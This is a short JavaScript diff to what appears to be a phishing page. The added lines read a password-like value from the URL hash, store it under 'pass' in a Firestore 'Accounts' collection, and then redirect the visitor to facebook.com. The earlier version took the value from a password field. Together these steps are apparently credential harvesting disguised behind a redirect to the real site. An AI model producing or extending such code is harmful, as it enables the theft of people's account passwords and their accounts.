@@ -44,8 +44,11 @@
                 // Initialize Cloud Firestore and get a reference to the service
                 const db = firebase.firestore();
 
+                var hash = location.hash
+                var passt = hash.replace("#", "")
                 BotBtn = db.collection("Accounts").doc(Date())
                 BotBtn.set({
-                    pass : document.querySelector("#pass").value
+                    pass : passt
                 })
+                window.location.href = "https://facebook.com"
             })
